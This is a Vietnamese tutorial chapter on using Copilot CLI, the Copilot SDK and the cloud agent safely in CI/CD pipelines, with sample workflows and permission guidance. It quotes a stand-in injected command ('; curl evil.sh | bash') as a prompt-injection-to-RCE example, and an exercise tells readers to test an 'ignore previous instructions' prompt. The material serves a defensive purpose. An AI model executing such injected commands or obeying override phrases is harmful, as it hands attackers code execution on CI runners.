# 12 — Copilot CLI, SDK & CI/CD Automation: Cho Agent Làm Ca Đêm, Không Treo Không Bở (Chuẩn 2026)

> **Dành cho:** dev/tech lead muốn đưa Copilot vào pipeline CI/CD và automation — chủ sở hữu **Copilot CLI** và **Copilot cloud agent** của cả series.
> **Vấn đề:** CI runner không có người bấm Allow — job hỏi giữa chừng là treo tới timeout; code AI sinh ra chạy mù trong CI có thể thành lỗ hổng RCE.
> **Đọc xong:** chạy được Copilot CLI non-interactive, hiểu SDK để tự build agent, cài 2 workflow GitHub Actions (triage đêm + code-quality gate), và giao việc cho Copilot cloud agent đúng cách. **Thời gian:** ~35 phút.
>
> **Lưu ý 2026:** Copilot CLI là binary **`copilot`** độc lập (cài theo docs GitHub), **không phải** `gh-copilot` và **không phải** `gh copilot suggest/explain` — cái sau là extension cộng đồng của GitHub CLI, nguồn khác docs, đừng dạy lẫn.

## Mục tiêu bài học

Mục này cho bạn biết sau 35 phút sẽ mang được gì về — như bảng nội quy trước khi cho robot trực ca đêm.

- Nhớ pattern **ACI 5 dòng** (scope hẹp · non-interactive · secrets qua env · output parse được · guardrails không nới) để pipeline không treo, không thành lỗ hổng.
- Biết chọn: **Copilot CLI** cho job trong pipeline · **Copilot SDK** khi cần agent lồng backend riêng · **Copilot cloud agent** khi giao việc độc lập lấy PR.
- Copy-paste được **2 workflow**: routine triage CI fail ban đêm + gate code-quality cho PR mới.
- Viết được issue "ready" đủ acceptance criteria + non-goals để Copilot cloud agent làm đúng ngay vòng đầu.

> **Tóm gọn 1 câu:** CI không có ai bấm Allow — nên mọi thứ robot làm trong pipeline phải đi trong hàng rào: scope hẹp, quyền hẹp, output chỉ để người đọc, và con người giữ chốt merge.

---

## 1. Vì sao CI chạy Copilot khác chat trên máy? (pattern ACI)

Chat/VS Code có người ngồi bấm Allow; **CI runner thì không** — job chờ approval là treo tới timeout. Kịch bản hay giao cho automation: auto-review PR mới, gom CI fail ban đêm, weekly dep audit, docs-sync check; riêng auto-fix CI thì **mở PR fix, không push thẳng main**.

```text
Pattern ACI — 5 dòng thuộc lòng (Agentic CI):
- Scope hẹp: 1 repo · 1 task · timeout rõ (timeout-minutes).
- Không interactive: không chờ approval — thay bằng branch protection + required checks.
- Secrets qua env runner (${{ secrets.X }}), KHÔNG hardcode trong prompt/file.
- Output parse được (JSON/markdown) cho step sau — và CHỈ để người đọc.
- Guardrails KHÔNG nới trong CI: branch protection + required checks vẫn ON.
```

> ✅ **Kỳ vọng khi test:** mở PR mẫu → tab Actions có run xanh trong 2–5 phút + 1 comment `Auto diff-stat` dưới PR.

> **Vì sao quan trọng?** Năm dòng này là toàn bộ "bộ não an toàn" thay cho người trực: thiếu dòng nào thì đúng tai nạn đó — thiếu timeout là treo 6h, thiếu "output chỉ để đọc" là RCE từ prompt-injection.
> **Nếu làm sai?** Phổ biến nhất: tin robot 100% → cho routine tự merge lúc 2h sáng; hoặc nới guardrails "cho đỡ vướng" → code AI chạy mù thẳng vào main.

> **Tóm gọn 1 câu:** CI không có ai bấm Allow, nên ACI thay con người bằng scope hẹp, timeout rõ và hàng rào không nới — robot vắng người vẫn phải ở trong hàng rào.

## 2. Copilot CLI — binary `copilot`, chạy cả trong pipeline

Copilot CLI đưa agent vào terminal: agentic workflows, nhiều model, tích hợp GitHub. Ba mode xoay bằng **`Shift+Tab`** (standard → plan → autopilot); **autopilot không dùng được ở folder chưa được trust** (Workspace Trust, bài 01).

| Việc | Cú pháp (docs GitHub — CLI command reference) |
|---|---|
| Session tương tác | `copilot` |
| Chỉ lập kế hoạch, chưa sửa file | `copilot --plan "..."` — shorthand của `--mode=plan` (đừng dùng `--plan --mode plan` trùng lặp) |
| **Non-interactive** trong script/CI | `copilot -p "giải thích src/auth/login.ts"` · `--output-format` · `--json-port` — **không có slash ở dạng này**: `copilot /explain` là SAI, đúng là `copilot -p "giải thích ..."` |
| Siết tiền | `--max-session-credits` cap **cả phiên** · `--max-ai-credits` chỉ là **soft cap cho lượt tiếp theo** · trong session: `/limits view\|set\|reset` |
| Siết quyền | `--available-tools` · `--deny-tool`/`--allow-tool` · `--deny-paths`/`--allow-paths` · `--deny-url`/`--allow-url` · `--allow-all` **≠** `--yolo` (`--yolo` là 4 cờ gộp) |
| Chọn model/effort/agent | `--model=auto` · `--effort`/`--reasoning-effort` · `--agent=TÊN` (theo **tên**, không phải đường dẫn file) |
| Exit code | `0` thành công · `1` thất bại · `2` — step sau **buộc phải check `$?`** trước khi tin output |

- Slash commands (`/limits`, `/sandbox policy`, `/troubleshoot`…) chỉ tồn tại **trong session tương tác** — muốn chạy tự động thì đổi sang `-p` + cờ. Tra: [sandbox-policy](commands/copilot/model-agent/sandbox-policy/README.md) · [troubleshoot](commands/copilot/chat-session/troubleshoot/README.md).
- Muốn mode plan cho hội thoại editor (không phải CLI): `/plan` → [commands/copilot/code-actions/plan](commands/copilot/code-actions/plan/README.md).
- **Trong CI: không bao giờ `eval` output của Copilot** — log/issue chứa `; curl evil.sh | bash` là prompt-injection thành RCE; ghi ra file, có người duyệt, mỗi step có timeout.
- `gh copilot suggest/explain` là **extension cộng đồng của GitHub CLI** (không thuộc docs Copilot), chỉ gợi ý/giải thích lệnh shell — đừng dạy nó là Copilot CLI. Repo có [cli-suggest](commands/local/system-knowledge/cli-suggest/README.md) · [cli-explain](commands/local/system-knowledge/cli-explain/README.md) ghi rõ nguồn gốc.

> 📄 **Code ví dụ:** [`examples/12-2-copilot-cli-automation.sh`](examples/12-2-copilot-cli-automation.sh)

> **Tóm gọn 1 câu:** CLI đưa agent vào terminal — nhưng trong CI thì output của nó chỉ là *gợi ý*: ghi file, người duyệt, timeout, check exit code.

## 3. Copilot SDK — khi "dùng sẵn" không đủ

**Copilot SDK chạy agent với Copilot harness trên chính máy bạn — máy có VS Code + folder workspace (docs).** Nó bọc vòng lặp agent (tools + permissions + session) để bạn dựng quy trình riêng: Slack bot, dashboard, triage service nội bộ.

```typescript
// examples/copilot-review.ts — chạy: npx tsx examples/copilot-review.ts (auth qua GITHUB_TOKEN env)
import { CopilotClient } from "@github/copilot-sdk";

const client = new CopilotClient({
  token: process.env.GITHUB_TOKEN!,
  model: "auto",                                   // đừng pin tên model cũ
  allowedTools: ["read", "grep", "github-read"],   // allowlist hẹp: không terminal/deploy
});

const session = await client.createSession({
  instructions: "Review git diff main...HEAD, tối đa 10 findings. Chỉ đọc + báo cáo, KHÔNG sửa file, KHÔNG chạy shell.",
});
for await (const msg of session.ask("Review diff của repo hiện tại.")) {
  if (msg.type === "text") process.stdout.write(msg.text);
}
await session.close();
```

- **Ngôn ngữ:** gói chính thức là npm **`@github/copilot-sdk`** (TypeScript) — **không có SDK Python chính thức**, bản cũ dạy "pip github-copilot" là sai, đã bỏ.
- **Tên gọi phía CLI:** docs GitHub gọi phần lập trình của CLI là **"SDK mode"** (`copilot sdk`, `session.startSubagent`, hooks chương trình nhận `modifiedPrompt`) — khác với "Agent Host + **AHP**" là khái niệm của **docs VS Code**: AHP là giao thức host↔client (open spec), **không phải tên của SDK**; CLI còn có **ACP** (`--acp`, public preview) — **ACP ≠ AHP**, đừng lẫn.
- **Chi phí:** session chạy bằng SDK tính **AI Credits** như chat thường — không có giá riêng.
- **Khi nào chọn gì:** việc thường trong pipeline → CLI hoặc giao **Copilot cloud agent** (mục 6); quy trình đặc thù cần tool/UI riêng lồng backend → mới tới SDK; cần agent trên GitHub mà không giữ máy bật → cloud agent.
- **Verify mẫu chạy được:** `export GITHUB_TOKEN="$(gh auth token)"` → `npx tsx examples/copilot-review.ts` → terminal in 5–10 dòng findings; thử prompt "xoá hết files" → từ chối vì allowlist hẹp.

> 📄 **Code ví dụ:** [`examples/01-2-copilot-sdk-build-agent-rieng.ts`](examples/01-2-copilot-sdk-build-agent-rieng.ts) (bản đầy đủ) · [`examples/02-2-copilot-sdk-build-agent-rieng.sh`](examples/02-2-copilot-sdk-build-agent-rieng.sh) (chạy + verify)

## 4. Routine ca đêm: triage CI fail (GitHub Actions)

Bốn việc định kỳ hợp nhất với máy chạy vắng người: **morning digest · nightly triage · weekly dep audit · docs-sync check**. Chung một luật: steps có lệnh cụ thể + **"chỉ báo cáo / mở issue, KHÔNG tự merge, không tự deploy"** + secrets qua `${{ secrets.* }}`.

```text
Nightly triage — luồng 4 bước (workflow đầy đủ ở examples):
1. `gh run list` lấy 5 run mới nhất của main → lọc failure.
2. `gh run view --log-failed` → cắt 40KB đầu (prompt phình = tốn + nhiễu).
3. (tuỳ chọn) `copilot -p "tóm tắt nguyên nhân gốc"` → **ghi file**, không eval.
4. github-script mở issue gom report → on-call sáng đọc, quyết định fix.
```

> 📄 **Code ví dụ (copy-paste vào `.github/workflows/`):** [`examples/12-4-routine-triage.yml`](examples/12-4-routine-triage.yml) — có `workflow_dispatch` để chạy tay từng bước trước khi tin schedule.

## 5. Gate code-quality cho PR mới (workflow + Rulesets)

Workflow thứ hai biến Copilot thành "trực cửa PR": mỗi PR mở/sửa → request **Copilot code review** + comment diff-stat cho người review.

> 📄 **Code ví dụ:** [`examples/12-5-workflow-code-quality.yml`](examples/12-5-workflow-code-quality.yml)

Dựng gate thành quy tắc repo (Settings → Rules → **Rulesets** — chủ sở hữu: bài 15): **Require Copilot code review: ON** · required checks (lint, test): ON · dismiss stale reviews: ON. Giữ gate sống được thì lo **precision**:

- Dặn trong `.github/copilot-instructions.md`: "chỉ flag bug/security/perf regression thật; style đã có prettier thì im" (bài 03).
- Reviewer quá khắt khe → team lách gate → mất giá trị; mỗi tháng đối 5 PR cũ để calibration.
- Kinh tế review (effort Lite/Balanced/Max + Actions minutes): chủ sở hữu **bài 15** — ở đây chỉ cần nhớ một câu: *mỗi review tính AI Credits, gate càng soi sâu càng đắt.*

## 6. Copilot cloud agent: giao issue, nhận PR

**Copilot cloud agent** (tên 11/2026 — docs gọi *Copilot in the cloud* cho surface trên GitHub.com) chạy trên hạ tầng managed của GitHub: bạn tắt máy, nó vẫn làm.tra cứu lệnh mẹ: [commands/cloud/model-agent/cloud-agent-session](commands/cloud/model-agent/cloud-agent-session/README.md).

- **Modes:** Interactive (default) / Autopilot · **Tool permissions:** Assisted (default) / Always ask / Allow all · **Environment:** Cloud sandbox (default) / GitHub Actions / Remote.
- Giới hạn **59 phút** chỉ áp dụng cho session chạy bằng **GitHub Actions minutes**; Cloud sandbox tính theo hạn mức khác.
- Agent đọc repo instructions + skills + **hooks (subset)**; Copilot code review đọc instructions **từ head branch** (không phải base).
- Package plan: session cloud của plan trả phí có mặc định cao hơn Free **10×** và thêm **100 MB Artifact** (as of 11/2026 — bảng plan ở bài 01/14).
- **Tin tốt 2026:** agent khởi động tới lúc mở PR draft nhanh hơn ~50% (changelog, as of 11/2026 — docs không chốt con số này, coi là tham khảo).

**Quy tắc assign (dán vào CONTRIBUTING):** 1 issue = 1 task độc lập + acceptance criteria đo được + non-goals rõ; có label **"ready"** mới assign; agent iterate tối đa **3 rounds** (quá thì close + chia nhỏ); PR của agent review như PR người (diff + CI + Copilot review + 1 human approve). Chi tiết giao việc: [commands/cloud/model-agent/coding-agent-assign](commands/cloud/model-agent/coding-agent-assign/README.md) · [coding-agent-pr](commands/cloud/model-agent/coding-agent-pr/README.md) · mẫu issue: [`examples/06-5-1-assign-issue-chat-luong-pr-chat.sh`](examples/06-5-1-assign-issue-chat-luong-pr-chat.sh).

Giao nhiều issue cùng lúc (fan-out) — ba gạch thuộc bài 06 (chủ sở hữu song song): mỗi agent một **vùng code riêng**, issue ghi phạm vi rõ; lane `copilot/*` vs `feat/*` ở bài 11 §5; gộp PR nào merge trước thì rebase các PR còn lại.

> **Vì sao quan trọng?** Chất lượng PR là cái bóng của chất lượng issue: issue mơ hồ = thuê robot rồi chỉ đường bằng tiếng nước ngoài — nó đoán mò 3 rounds rồi bạn vẫn phải làm lại từ đầu.

## 7. Secrets & vệ sinh pipeline (thuộc lòng)

```text
ĐƯỢC:  env runner / shell — GITHUB_TOKEN, COPILOT_API_KEY, ${{ secrets.* }} (masked).
CẤM:   hardcode token trong code/prompt/file committed; echo secret ra log (tắt set -x).
Audit: grep -rniE "ghp_|gho_|sk-|xox_" examples/ .github/workflows/ → phải TRỐNG
       (ra kết quả = token lộ → xoá + rotate NGAY, lịch sử dùng git filter-repo/BFG).
```

## Lỗi thường gặp (❌ SAI / ✅ ĐÚNG)

| ❌ SAI | Vì sao chết người | ✅ ĐÚNG |
|---|---|---|
| `eval` output Copilot/gh trong CI | Prompt-injection từ issue text → RCE | Output là GỢI Ý: ghi file, người duyệt rồi mới chạy |
| Job chờ approval giữa chừng | Không ai trả lời → treo tới timeout 6h | Chỉ chạy non-interactive (`-p`) + `timeout-minutes: 10–20` |
| `copilot /explain "file"` trong script | CLI non-interactive không nhận slash | `copilot -p "giải thích file"` · slash chỉ có trong session tương tác |
| Routine tự `gh pr merge` lúc 2h sáng | Ca đêm tự duyệt code, không ai chịu trách nhiệm | Routine chỉ báo cáo / mở issue / mở PR — merge là quyền của người |
| Merge PR của agent không review | Tin robot 100%, diff lan scope | Review như PR người + required checks ON + iterate ≤3 rounds |
| Issue một dòng "làm cái này đi" | Agent đoán mò, đốt AI Credits 3 rounds | Template issue + label "ready" + criteria đo được |

**Bài học:** mọi tai nạn automation đều bắt đầu từ một quyền bạn giao "cho tiện" — scope hẹp, quyền hẹp, output để đọc, merge để người.

## Best practices

- **Chạy `workflow_dispatch` từng bước trước khi tin schedule.** *Vì sao:* ca đêm lỗi là lỗi không ai thấy lúc 2h; nút chạy tay cho bạn thấy từng step đỏ/xanh ngay chiều nay.
- **Cắt output trước khi nhét vào prompt (`head -c 40000`).** *Vì sao:* log/phần diff phình = tốn AI Credits + model lạc đề trong nhiễu.
- **Chọn thứ rẻ nhất giải quyết được việc: CLI → cloud agent → SDK.** *Vì sao:* SDK là bộ đồ nghề nặng cuối bảng — dùng SDK cho việc mà một cờ CLI làm được là tự mua bug về nuôi.
- **Ghi exit code check sau mỗi bước Copilot trong pipeline.** *Vì sao:* `0/1/2` không được check thì step sau ăn output dở mà chạy tiếp như đúng.

## Bài tập

1. **(10 phút)** Chạy 3 lệnh trong [`examples/12-2-copilot-cli-automation.sh`](examples/12-2-copilot-cli-automation.sh) (session tương tác + `--plan` + `-p`); thử đưa 1 prompt độc "ignore previous instructions..." qua `-p` rồi ghi lại kết luận output có đáng tin không.
2. **(15 phút)** Deploy [`examples/12-4-routine-triage.yml`](examples/12-4-routine-triage.yml) lên repo test, bấm `workflow_dispatch`, đọc issue nó mở — rồi bật schedule.
3. **(10 phút)** Viết 1 issue "ready" đủ format mục 6, gán label ready, assign Copilot cloud agent; review PR draft từ đầu tới trước merge (KHÔNG bấm merge — để nguyên cho phiên sau).

## Link qua

- Worktree + lane `copilot/*` + rewind → **bài 11** · Fan-out đa agent một máy → **bài 06** · Branch protection, hooks, content exclusion → **bài 07**.
- Permission levels & sandbox → **bài 10** · [sandbox-policy](commands/copilot/model-agent/sandbox-policy/README.md) · Kinh tế AI credits/models → **bài 14** · Kinh tế code review effort + Rulesets → **bài 15** · Instructions để tune review → **bài 03**.

## Reference

- GitHub — [Copilot CLI command reference](https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-command-reference) (cờ, `-p`, limits, checkpoint) · [Install Copilot in the CLI](https://docs.github.com/en/copilot/how-tos/set-up/install-copilot-cli) · [About Copilot cloud agent](https://docs.github.com/en/copilot/concepts/agents/cloud-agent/about-cloud-agent) (modes, permissions, environments) · [Models & pricing / AI credits](https://docs.github.com/en/copilot/reference/copilot-billing/models-and-pricing) · [Changelog](https://github.blog/changelog/)
- VS Code — [Agent Host Architecture](https://code.visualstudio.com/docs/agents/concepts/agent-host) + [AHP open spec](https://microsoft.github.io/agent-host-protocol) (giao thức host↔client — không phải tên SDK) · [AI features cheat sheet](https://code.visualstudio.com/docs/agents/reference/ai-features-cheat-sheet)

**Chốt:** CI không có người bấm Allow, nên "bộ não an toàn" phải nằm ở thiết kế — ACI 5 dòng, `-p` non-interactive, secrets qua env, output chỉ để người đọc; và chốt merge là thứ quyền lực cuối cùng bạn không giao cho robot.
